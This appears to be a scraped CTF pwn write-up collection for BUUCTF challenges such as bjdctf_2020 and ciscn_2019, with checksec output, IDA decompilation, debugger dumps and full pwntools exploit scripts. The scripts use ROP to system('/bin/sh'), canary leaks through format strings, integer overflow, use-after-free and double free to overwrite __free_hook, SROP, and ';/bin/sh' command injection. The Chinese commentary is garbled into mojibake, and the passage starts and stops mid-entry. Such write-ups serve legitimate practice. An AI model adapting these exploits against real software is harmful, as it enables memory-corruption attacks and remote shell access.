addr=&gt;%x&quot;,sys_addr)log.info(&quot;/bin/sh=&gt;%x&quot;,binsh)payload = &#x27;a&#x27;*(0x20+8)payload += p64(pop_rdi_ret)+p64(binsh)payload += p64(sys_addr)p.sendlineafter(&quot;story!&quot;,payload)p.interactive() bjdctf_2020_babyrop2 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA gift 12345678910111213unsigned __int64 gift()&#123; char format; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;I&#x27;ll give u some gift to help u!&quot;); __isoc99_scanf(&quot;%6s&quot;, &amp;format); printf(&amp;format, &amp;format); puts(byte_400A05); fflush(0LL); return __readfsqword(0x28u) ^ v2;&#125; vuln 12345678910unsigned __int64 vuln()&#123; char buf; // [rsp+0h] [rbp-20h] unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;Pull up your sword and tell me u story!&quot;); read(0, &amp;buf, 0x64uLL); return __readfsqword(0x28u) ^ v2;&#125; ä»giftåˆ©ç”¨å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´æ³„éœ²canaryï¼Œå†åˆ©ç”¨vulnæ‰§è¡Œæ¼æ´ 3.EXP 12345678910111213141516171819202122232425262728293031from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf= ELF(&quot;./bjdctf_2020_babyrop2&quot;)#p = process(&quot;./bjdctf_2020_babyrop2&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;27381&quot;)p.sendlineafter(&quot;to help u!\\n&quot;,&quot;%7$p&quot;)p.recvuntil(&quot;0x&quot;)canary=int(p.recv(16),16)success(&quot;Canary=&gt;0x%x&quot;,canary)pop_rdi_ret = 0x0400993payload = &#x27;a&#x27;*0x18+p64(canary)+&#x27;a&#x27;*8payload += p64(pop_rdi_ret)+p64(elf.got[&quot;puts&quot;])payload += p64(elf.plt[&quot;puts&quot;])+p64(elf.sym[&quot;vuln&quot;])p.sendlineafter(&quot;tell me u story!&quot;,payload)leak = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;))libc = LibcSearcher(&quot;puts&quot;,leak)base = leak-libc.dump(&quot;puts&quot;)sys_addr = base + libc.dump(&quot;system&quot;)binsh = base+ libc.dump(&quot;str_bin_sh&quot;)payload=&#x27;a&#x27;*0x18+p64(canary)+p64(0)payload+=p64(pop_rdi_ret)+p64(binsh)payload+=p64(sys_addr)p.sendlineafter(&quot;!&quot;,payload)p.interactive() bjdctf_2020_babystack 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-10h] size_t nbytes; // [rsp+Ch] [rbp-4h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); LODWORD(nbytes) = 0; puts(&quot;**********************************&quot;); puts(&quot;* Welcome to the BJDCTF! *&quot;); puts(&quot;* And Welcome to the bin world! *&quot;); puts(&quot;* Let&#x27;s try to pwn the world! *&quot;); puts(&quot;* Please told me u answer loudly!*&quot;); puts(&quot;[+]Are u ready?&quot;); puts(&quot;[+]Please input the length of your name:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;nbytes); puts(&quot;[+]What&#x27;s u name?&quot;); read(0, &amp;buf, (unsigned int)nbytes); return 0;&#125; back_door 12345signed __int64 backdoor()&#123; system(&quot;/bin/sh&quot;); return 1LL;&#125; nbyteså¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œä»è€Œé€ æˆæ ˆæº¢å‡º 3.EXP 123456from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,25325)p.sendlineafter(&quot;:&quot;,str(0x100))p.sendlineafter(&quot;?&quot;,&#x27;a&#x27;*0x18+p64(0x04006EA))p.interactive() bjdctf_2020_babystack2 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678910111213141516171819202122232425int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-10h] size_t nbytes; // [rsp+Ch] [rbp-4h] setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); LODWORD(nbytes) = 0; puts(&quot;**********************************&quot;); puts(&quot;* Welcome to the BJDCTF! *&quot;); puts(&quot;* And Welcome to the bin world! *&quot;); puts(&quot;* Let&#x27;s try to pwn the world! *&quot;); puts(&quot;* Please told me u answer loudly!*&quot;); puts(&quot;[+]Are u ready?&quot;); puts(&quot;[+]Please input the length of your name:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;nbytes); if ( (signed int)nbytes &gt; 10 ) &#123; puts(&quot;Oops,u name is too long!&quot;); exit(-1); &#125; puts(&quot;[+]What&#x27;s u name?&quot;); read(0, &amp;buf, (unsigned int)nbytes); return 0;&#125; (signed int)nbytes ä¸ºæ­£æ•´æ•°ï¼Œæ‰€ä»¥å­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ backdoor 12345signed __int64 backdoor()&#123; system(&quot;/bin/sh&quot;); return 1LL;&#125; 3.EXP 123456789101112from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./bjdctf_2020_babystack2&quot;)#p = process(&quot;./bjdctf_2020_babystack2&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;28949&quot;)back_door = 0x0400726payload = &#x27;a&#x27;*0x18+p64(back_door)p.sendlineafter(&quot;:\\n&quot;,&#x27;-1&#x27;)p.sendlineafter(&quot;?\\n&quot;,payload)p.interactive() bjdctf_2020_router 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.è¿è¡Œ 1234567Welcome to BJDCTF router test program!1.ping2.test3.leave comments4.root5.exitPlease input u choose: æ ¹æœ¬ä¸ç”¨EXPï¼Œè€ƒå¯Ÿçš„æ˜¯linuxçš„ å‘½ä»¤æ˜¯åˆ©ç”¨;åˆ†å‰²çš„ 3.EXP 1234567891011from pwn import *p = process(&#x27;./bjdctf_2020_router&#x27;)elf = ELF(&#x27;./bjdctf_2020_router&#x27;)context.log_level = &#x27;debug&#x27;p.recv()p.sendline(&quot;1&quot;)p.recv()#p.sendline(&#x27;;cat flag&#x27;)p.sendline(&#x27;;/bin/sh&#x27;)p.interactive() bjdctf_2020_YDSneedGrirlfriend 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA åŸºæœ¬åŠŸèƒ½ 123456789101112def add(sz,text): sh.sendlineafter(&quot;Your choice :&quot;,&quot;1&quot;) sh.sendlineafter(&quot;Her name size is :&quot;,str(sz)) sh.sendlineafter(&quot;Her name is :&quot;,text)def delete(idx): sh.sendlineafter(&quot;Your choice :&quot;,&quot;2&quot;) sh.sendlineafter(&quot;Index :&quot;,str(idx))def show(idx): sh.sendlineafter(&quot;Your choice :&quot;,&quot;3&quot;) sh.sendlineafter(&quot;Index :&quot;,str(idx)) del_girlfriend 123456789if ( v1 &gt;= 0 &amp;&amp; v1 &lt; count ) &#123; if ( girlfriendlist[v1] ) // UAF &#123; free(*((void **)girlfriendlist[v1] + 1)); // free(chunk) free(girlfriendlist[v1]); // free(size) puts(&quot;Success&quot;); &#125; &#125; é‡Šæ”¾åæŒ‡é’ˆæ²¡æœ‰ç½®0ï¼Œé€ æˆ use after free print_girlfriend_name 1234int __fastcall print_girlfriend_name(__int64 a1)&#123; return puts(*(const char **)(a1 + 8));&#125; ä½äºæ‰€ç”³è¯·çš„chunkä¸­ï¼Œå¯ä»¥é€šè¿‡ä¹‹å‰çš„uafæ¼æ´å°†å…¶æ”¹å†™ back_door 12345int backdoor()&#123; puts(&quot;YDS get N+ girlfriend!&quot;); return system(&quot;/bin/sh&quot;);&#125; ç›´æ¥è¦†ç›–print_girlfriend_name ä¸º back_door å°±è¡Œäº† 3.EXP 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *elf = ELF(&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)sh = 0def add(sz,text): sh.sendlineafter(&quot;Your choice :&quot;,&quot;1&quot;) sh.sendlineafter(&quot;Her name size is :&quot;,str(sz)) sh.sendlineafter(&quot;Her name is :&quot;,text)def delete(idx): sh.sendlineafter(&quot;Your choice :&quot;,&quot;2&quot;) sh.sendlineafter(&quot;Index :&quot;,str(idx))def show(idx): sh.sendlineafter(&quot;Your choice :&quot;,&quot;3&quot;) sh.sendlineafter(&quot;Index :&quot;,str(idx))def main(ip,port,mode,debug): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(&quot;bjdctf_2020_YDSneedGrirlfriend&quot;) else: sh = remote(ip,port) add(0x60,&#x27;aaaa&#x27;)#0 add(0x60,&#x27;bbbb&#x27;)#1 delete(0) delete(1) add(0x10,p64(0x400B9C)) show(0) sh.interactive()if __name__ == &#x27;__main__&#x27;: main(&quot;node3.buuoj.cn&quot;,&quot;27659&quot;,1,1) ciscn_2019_c_1 ç¯å¢ƒï¼šUbuntu18 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; FILE *v3; // rdi setvbuf(_bss_start, 0LL, 2, 0LL); v3 = stdin; setvbuf(stdin, 0LL, 2, 0LL); func(v3, 0LL); return 0;&#125; func 123456789101112131415int func()&#123; int result; // eax char v1; // [rsp+0h] [rbp-30h] float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(&quot;Let&#x27;s guess the number.&quot;); gets(&amp;v1); if ( v2 == 11.28125 ) result = system(&quot;cat /flag&quot;); else result = puts(&quot;Its value should be 11.28125&quot;); return result;&#125; string 123456789101112131415LOAD:0000000000400238 0000001C C /lib64/ld-linux-x86-64.so.2LOAD:0000000000400399 0000000A C libc.so.6LOAD:00000000004003A3 00000005 C getsLOAD:00000000004003A8 00000005 C putsLOAD:00000000004003AD 00000006 C stdinLOAD:00000000004003B3 00000007 C stdoutLOAD:00000000004003BA 00000007 C systemLOAD:00000000004003C1 00000008 C setvbufLOAD:00000000004003C9 00000012 C __libc_start_mainLOAD:00000000004003DB 0000000F C __gmon_start__LOAD:00000000004003EA 0000000C C GLIBC_2.2.5.rodata:00000000004007B4 00000018 C Let&#x27;s guess the number..rodata:00000000004007CC 0000000A C cat /flag.rodata:00000000004007D6 0000001D C Its value should be 11.28125.eh_frame:000000000040089F 00000006 C ;*3$\\&quot; v1çš„æ ˆç©ºé—´è¦†ç›–åˆ°v2 3.EXP 1234567from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,26782)number_addr = 0x41348000payload = &#x27;\\x00&#x27;*(0x30-4) + p64(number_addr)p.sendlineafter(&quot;Let&#x27;s guess the number.\\n&quot;,payload)print p.recv() numberæ˜¯åœ°å€ä¸‹é¢ä¿å­˜çš„16è¿›åˆ¶å€¼ ciscn_2019_en_2 å’Œciscn_2019_c_1ä¸€æ · ciscn_2019_en_3 1.checksec 123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled 2.IDA main 12345puts(&quot;Welcome to the story kingdom.&quot;); puts(&quot;What&#x27;s your name?&quot;); read(0, &amp;buf, 0x20uLL); _printf_chk(1LL, (__int64)&amp;buf); puts(&quot;Please input your ID.&quot;); å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ï¼Œå¯ä»¥ä»è¿™é‡Œæ³„éœ²libc base åªæœ‰ä¸¤ä¸ªæœ‰æ•ˆåŠŸèƒ½ 12345678def add(sz,text): p.sendlineafter(&quot;: &quot;,&quot;1&quot;) p.sendlineafter(&quot;: &quot;,str(sz)) p.sendlineafter(&quot;: &quot;,text)def delete(idx): p.sendlineafter(&quot;: &quot;,&quot;4&quot;) p.sendlineafter(&quot;: &quot;,str(idx)) main 1234567puts(&quot;Welcome to the story kingdom.&quot;);puts(&quot;What&#x27;s your name?&quot;);read(0, &amp;buf, 0x20uLL);_printf_chk(1LL, &amp;buf);puts(&quot;Please input your ID.&quot;);read(0, &amp;s, 8uLL);puts(&amp;s); å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ï¼Œprintf_chkå‡½æ•°ï¼Œå¯¼è‡´ä½ åœ¨ä½¿ç”¨%a$pæ—¶éœ€è¦åŒæ—¶ä½¿ç”¨%(1åˆ°a)$pæ‰å¯ä»¥ï¼Œå¹¶ä¸”ç¦ç”¨äº†%nï¼Œæ‰€ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™çš„è¿™æ¡è·¯åŸºæœ¬è¢«passæ‰ï¼Œåªæœ‰å¯èƒ½è¿›è¡Œä¸€äº›ç®€å•çš„leak delete 123456789101112unsigned __int64 delete()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;Please input the index:&quot;); _isoc99_scanf(&quot;%d&quot;, &amp;v1); free(qword_202068[2 * v1]); puts(&quot;Done!&quot;); return __readfsqword(0x28u) ^ v2;&#125; æŒ‡é’ˆæœªæ¸…0 3.GDB 12345678910#code:p.sendlineafter(&#x27;name?&#x27;,&#x27;aaaaaa&#x27;) gdb.attach(p) p.sendlineafter(&#x27;ID.&#x27;,&#x27;2&#x27;*8) leak = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) log.success(&#x27;leak addr =&gt; 0x%x&#x27;,leak)#gdb0x7fffa19cf4b0 â—‚â€” 0x3232323232323232 (&#x27;22222222&#x27;)0x7fffa19cf4b8 â€”â–¸ 0x7fc2db859237 (setbuffer+231) â—‚â€” test dword ptr [rbx], 0x80000x7fffa19cf4c0 â—‚â€” 0xa616161616161 /* &#x27;aaaaaa\\n&#x27; */ è¿™ä¸ªæ—¶å€™0x7fffa19cf4b0è¢«å¡«å……å®Œå…¨ï¼Œæ¥ç€è¾“å‡ºå°±ä¼šè¾“å‡º0x7fffa19cf4b8çš„å†…å®¹ï¼Œ0x7fffa19cf4b8çš„å†…å®¹å°±æ˜¯0x7fc2db859237 (setbuffer+231)ï¼Œæ‰€ä»¥å¾—å‡ºè¿™æ—¶çš„libc_now=0x7fc2db859237 - 231ï¼Œé‚£ä¹ˆlibc base = libc_now - libc.sym[&quot;setbuffer&quot;] æ¥ç€å°±æ˜¯å¡«å…¥/bin/shï¼Œæ”¹_free_hookä¸ºsystem 4.EXP 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./ciscn_2019_en_3&quot;)libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.27.so&quot;)#p = process(&quot;./ciscn_2019_en_3&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;27106&quot;)def add(sz,text): p.sendlineafter(&quot;choice:&quot;,&quot;1&quot;) p.sendlineafter(&quot;: \\n&quot;,str(sz)) p.sendlineafter(&quot;: \\n&quot;,text)def delete(idx): p.sendlineafter(&quot;choice:&quot;,&quot;4&quot;) p.sendlineafter(&quot;:\\n&quot;,str(idx))if __name__ == &#x27;__main__&#x27;: p.sendlineafter(&#x27;name?&#x27;,&#x27;aaaaaa&#x27;) p.sendlineafter(&#x27;ID.&#x27;,&#x27;2&#x27;*8) libcbase=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))-231-libc.sym[&#x27;setbuffer&#x27;] free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;] system=libcbase+libc.sym[&#x27;system&#x27;] log.success(&#x27;libc base =&gt; 0x%x&#x27;,libcbase) log.success(&#x27;free hook =&gt; %x&#x27;,free_hook) log.success(&#x27;sys addr =&gt; 0x%x&#x27;,system) add(0x20,&#x27;aaaa&#x27;)#0 add(0x20,&#x27;/bin/sh\\x00&#x27;) delete(0) delete(0) #double free add(0x20,p64(free_hook)) add(0x20,&#x27;dd&#x27;) add(0x20,p64(system)) delete(1) p.interactive() ciscn_2019_es_1 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA 12345678910111213def add(sz,name,call): p.sendlineafter(&quot;choice:&quot;,&#x27;1&#x27;) p.sendlineafter(&quot;Please input the size of compary&#x27;s name\\n&quot;,str(sz)) p.sendlineafter(&quot;please input name:&quot;,name) p.sendlineafter(&quot;please input compary call:&quot;,call)def show(idx): p.sendlineafter(&quot;choice:&quot;,&#x27;2&#x27;) p.sendlineafter(&quot;index:\\n&quot;,str(idx))def free(idx): p.sendlineafter(&quot;choice:&quot;,&#x27;3&#x27;) p.sendlineafter(&quot;index:\\n&quot;,str(idx)) add 12puts(&quot;please input name:&quot;); read(0, (void *)*heap_addr_4080[heap_number], (unsigned int)size); è¿™ä¸ªå¯ä»¥ç›´æ¥è®©æˆ‘ä»¬å†™åˆ°chunk-&gt;fdçš„ä½ç½® call 123456 if ( heap_addr_4080[v1] ) free((void *)*heap_addr_4080[v1]); puts(&quot;You try it!&quot;); puts(&quot;Done&quot;); return __readfsqword(0x28u) ^ v2;&#125; è¿™é‡Œæ²¡æœ‰é‡Šæ”¾åæ²¡æœ‰æ¸…é›¶ï¼Œuse after free æ€è·¯ 1.åˆ©ç”¨showå‡½æ•°æ³„éœ²libc 2.ç¨‹åºé‡Œé¢æœ‰ä¸ªuafï¼Œåˆ©ç”¨è¿™ä¸ªè¿›è¡Œdouble_freeæ¥ä¿®æ”¹tcacheé‡Œé¢çš„fdæŒ‡é’ˆï¼Œä»è€Œå°†free_hookæ”¹ä¸º_libc_system 3.freeæ‰æˆ‘ä»¬æå‰åŸ‹ä¸‹çš„**/bin/sh**çš„chunkï¼Œä»è€Œgetshell 3.gdb åˆ©ç”¨showå‡½æ•°æ³„éœ²libc 123456add(0x410,&#x27;aaaa&#x27;,&#x27;123&#x27;)add(0x20,&quot;bbbb&quot;,&#x27;124&#x27;)add(0x20,&quot;/bin/sh\\x00&quot;,&#x27;125&#x27;)free(0)show(0) 2.ç¨‹åºé‡Œé¢æœ‰ä¸ªuafï¼Œåˆ©ç”¨è¿™ä¸ªè¿›è¡Œdouble_freeæ¥ä¿®æ”¹tcacheé‡Œé¢çš„fdæŒ‡é’ˆï¼Œä»è€Œå°†free_hookæ”¹ä¸º_libc_system double free 12free(1)free(1) â€‹ gdb 1234567891011121314151617pwndbg&gt; bintcachebins0x30 [ 2]: 0x55ce4a46d6c0 â—‚â€” 0x55ce4a46d6c0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x55ce4a46d270 â€”â–¸ 0x7ff520e96ca0 (main_arena+96) â—‚â€” 0x55ce4a46d270smallbinsemptylargebinsempty ä¿®æ”¹free_hook 123add(0x28,p64(free_hook),&#x27;126&#x27;)add(0x28,&#x27;111&#x27;,&#x27;127&#x27;)add(0x28,p64(system),&#x27;128&#x27;) 4.EXP è¿™é‡Œæ˜¯æ”¹freeä¸ºsystemï¼Œæ‰€ä»¥å°±å¿…é¡»å…ˆlibc leakï¼Œ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *elf = ELF(&quot;ciscn_s_6&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)sh = 0def add(sz,name,call): sh.sendlineafter(&quot;choice:&quot;,&#x27;1&#x27;) sh.sendlineafter(&quot;Please input the size of compary&#x27;s name\\n&quot;,str(sz)) sh.sendlineafter(&quot;please input name:&quot;,name) sh.sendlineafter(&quot;please input compary call:&quot;,call)def show(idx): sh.sendlineafter(&quot;choice:&quot;,&#x27;2&#x27;) sh.sendlineafter(&quot;index:\\n&quot;,str(idx))def free(idx): sh.sendlineafter(&quot;choice:&quot;,&#x27;3&#x27;) sh.sendlineafter(&quot;index:\\n&quot;,str(idx))def main(ip,port,debug,mode): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(&quot;ciscn_s_6&quot;) else: sh = remote(ip,port) add(0x410,&#x27;aaaa&#x27;,&#x27;123&#x27;) add(0x20,&quot;bbbb&quot;,&#x27;124&#x27;) add(0x20,&quot;/bin/sh\\x00&quot;,&#x27;125&#x27;) free(0) show(0) #0x7fffff3ebca0 (main_arena+96) leak_addr = u64(sh.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) libc_base = leak_addr-96-0x10-libc.sym[&quot;__malloc_hook&quot;] free_hook=libc_base+libc.sym[&quot;__free_hook&quot;] system = libc_base+libc.sym[&quot;system&quot;] log.info(&quot;libc base=&gt;%x&quot;,libc_base) log.info(&quot;free_hook=&gt;%x&quot;,free_hook) log.info(&quot;system real=&gt;%x&quot;,system) #double free free(1) free(1) add(0x28,p64(free_hook),&#x27;126&#x27;) add(0x28,&#x27;111&#x27;,&#x27;127&#x27;) add(0x28,p64(system),&#x27;128&#x27;) #GDB() free(2) sh.interactive()if __name__ == &#x27;__main__&#x27;: main(&quot;node3.buuoj.cn&quot;,&quot;28066&quot;,0,0) ä¸ºä»€ä¹ˆæ˜¯0x3c4b78ï¼Ÿ åŠ¨æ€è°ƒè¯•å‡ºæ¥ï¼Œæ³„éœ²çš„unsorted binåœ°å€å‡å»vmmapä¸‹æŸ¥çœ‹çš„libcåŸºå€ add(0x410,â€˜aaaaâ€™,â€˜123â€™)ï¼Œä¸ºä»€ä¹ˆæ˜¯0x410ï¼Ÿ å› ä¸ºaddå¯¹ç”³è¯·çš„å †çš„å¤§å°æ²¡æœ‰é™åˆ¶ï¼Œè€Œç”³è¯·ä¸€ä¸ªå¤§çš„å †å—(&gt;0x400)ï¼Œè¿™ä¸ªå †å—è¢«freeåå°±ä¼šç›´æ¥è¢«åˆ†é…è¿›å…¥unsorted bin ciscn_2019_es_2 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(); puts(&quot;Welcome, my friend. What&#x27;s your name?&quot;); vul(); return 0;&#125; vul 12345678910int vul()&#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); read(0, &amp;s, 0x30u); printf(&quot;Hello, %s\\n&quot;, &amp;s); read(0, &amp;s, 0x30u); return printf(&quot;Hello, %s\\n&quot;, &amp;s);&#125; hack 1234int hack()&#123; return system(&quot;echo flag&quot;);&#125; å› ä¸ºæœ‰systemï¼Œå¯ä»¥ä¸ç”¨libc_leak,ä½†æ˜¯è¦æ³„éœ²EBP 12345678910111213141516171819====system(&quot;/bin/sh\\x00&quot;)====must size()=0x28=40====then can overflow| a*4 || a*4 || Addr_1 || b*4 || sys_plt || sys_ret || Addr_2 || /bin || /sh\\x00 || å¯¹é½ |=====ret_addr:| Addr_3 |==========0x28+4=44=0x2c= Addr_3Addr_1=44-4-4=36=0x24Addr_2=44-4*5=24=0x1c(sys_retä¸åœ¨ebpä¸Šåç§»ä¼ å‚) 3.EXP 123456789101112131415161718from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29643)elf = ELF(&quot;./ciscn_2019_es_2&quot;)sys_addr = 0x8048400 #-------EBP_LEAK-------------pl = &#x27;a&#x27;*0x20+&quot;b&quot;*8p.send(pl)p.recvuntil(&#x27;b&#x27;*8)ebp = u32(p.recv(4))print(hex(ebp))pl2=(&#x27;a&#x27;*8+p32(ebp-0x24)+&#x27;bbbb&#x27;+p32(sys_addr)+&#x27;cccc&#x27;+p32(ebp-0x1c)+&#x27;/bin/sh\\x00&#x27;).ljust(0x28,&#x27;p&#x27;)+p32(ebp-0x2c) #p32(sys_addr)+&#x27;aaaa&#x27;+p32(sh_addr)p.send(pl2)p.interactive() ciscn_2019_es_7 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA vuln 123456789101112131415161718192021222324252627; read(fd,buf,0x400); write(fd,buf,0x30); Attributes: bp-based frame public vulnvuln proc near ; CODE XREF: main+14â†“pbuf = byte ptr -10h; __unwind &#123; push rbp mov rbp, rsp xor rax, rax mov edx, 400h ; count lea rsi, [rsp+buf] ; buf mov rdi, rax ; fd syscall ; LINUX - sys_read mov rax, 1 mov edx, 30h ; count lea rsi, [rsp+buf] ; buf mov rdi, rax ; fd syscall ; LINUX - sys_write retnvuln endp ; sp-analysis failed; --------------------------------------------------------------------------- db 90h; --------------------------------------------------------------------------- pop rbp retn; &#125; // starts at 4004ED åˆ†æsyscallï¼Œå‘ç°åªæœ‰readå’Œwriteã€‚ gadgets 12345678910111213141516gadgets proc near; __unwind &#123; push rbp mov rbp, rsp mov rax, 0Fh ; //constants.SYS_sigreturn retngadgets endp ; sp-analysis failed; --------------------------------------------------------------------------- mov rax, 3Bh ; //execve retn; --------------------------------------------------------------------------- db 90h; --------------------------------------------------------------------------- pop rbp retn; &#125; // starts at 4004D6 mov rax, 0Fh: åœ¨syscallé‡Œé¢ï¼Œ0xfä»£è¡¨constants.SYS_sigreturn mov rax, 3Bh: åœ¨syscallé‡Œé¢ï¼Œ0x3bä»£è¡¨execve æ‰€ä»¥è¦ç”¨SROP 3.EXP 123456789101112131415161718192021222324from pwn import *from LibcSearcher import *#sh=process(&quot;./ciscn_2019_es_7&quot;)context.log_level =&#x27;debug&#x27; context.arch=&#x27;amd64&#x27;sh=remote(&quot;node3.buuoj.cn&quot;,27162)syscall_ret=0x400517read=0x4004f1movrax_sigreturn=0x4004damovrax_system=0x4004E2sh.send(&quot;/bin/sh&quot;+&quot;\\x00&quot;*9+p64(read))sh.recv(32)stack_addr=u64(sh.recv(8))log.success(&quot;stack: &quot;+hex(stack_addr))sh.recv(8)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr - 280 # &quot;/bin/sh&quot; &#x27;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retsh.send(&quot;/bin/sh&quot;+&quot;\\x00&quot;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(sigframe))sh.interactive() ciscn_2019_final_2 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA è€å‡ æ ·äº† 12345678910111213141516171819202122def add_int(add_type, add_num): p.sendlineafter(&#x27;&gt; &#x27;, &#x27;1&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, &#x27;1&#x27;) p.sendafter(&#x27;your inode number:&#x27;, str(add_num))def add_short(add_num): p.sendlineafter(&#x27;&gt; &#x27;, &#x27;1&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, &#x27;2&#x27;) p.sendafter(&#x27;:&#x27;, str(add_num))def remove(remove_type): p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;2&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, str(remove_type))def show(show_type): p.sendlineafter(&#x27;&gt; &#x27;, &#x27;3&#x27;) p.sendlineafter(&#x27;short int\\n&gt;&#x27;, str(show_type)) if show_type == 1: p.recvuntil(&#x27;:&#x27;) elif show_type == 2: p.recvuntil(&#x27;:&#x27;) return int(p.recvuntil(&#x27;\\n&#x27;)) init 12345678fd = open(&quot;flag&quot;, 0);if ( fd == -1 )&#123; puts(&quot;no such file :flag&quot;); exit(-1);&#125;dup2(fd, 666);close(fd); dup2(fd, 666)çš„æ„æ€æ˜¯ï¼ŒnewfdæŒ‡å‘oldfdå¥æŸ„æŒ‡å‘çš„æ–‡ä»¶æè¿°ç¬¦ç»“æ„ï¼Œå³åŸæœ¬æ˜¯æŒ‡å‘æ ‡å‡†è¾“å‡ºæ–‡ä»¶æè¿°ç»“æ„ä½“çš„666æŒ‡å‘äº†flagï¼Œè¿™æ ·ä¸€æ¥ï¼ŒåŸæœ¬è¾“å‡º åˆ°æ˜¾ç¤ºå™¨ç»ˆç«¯çš„å­—ç¬¦ä¸²å°±æ‰“å°åˆ°test.fileæ–‡ä»¶ä¸­äº†ï¼Œè¿™ä¹Ÿæ˜¯Linuxæ“ä½œç³»ç»Ÿçš„é‡å®šå‘å®ç°æ–¹æ³• fileno()ç”¨æ¥å–å¾—å‚æ•°streamæŒ‡å®šçš„æ–‡ä»¶æµæ‰€ä½¿ç”¨çš„æ–‡ä»¶æè¿°è¯ è¿”å›å€¼ ï¼šè¿”å›å’Œstreamæ–‡ä»¶æµå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœå¤±è´¥ï¼Œè¿”å›-1 bye_bye 123456789101112void __noreturn bye_bye()&#123; char v0; // [rsp+0h] [rbp-70h] unsigned __int64 v1; // [rsp+68h] [rbp-8h] v1 = __readfsqword(0x28u); puts(&quot;what do you want to say at last? &quot;); __isoc99_scanf(&quot;%99s&quot;, &amp;v0); printf(&quot;your message :%s we have received...\\n&quot;, &amp;v0); puts(&quot;have fun !&quot;); 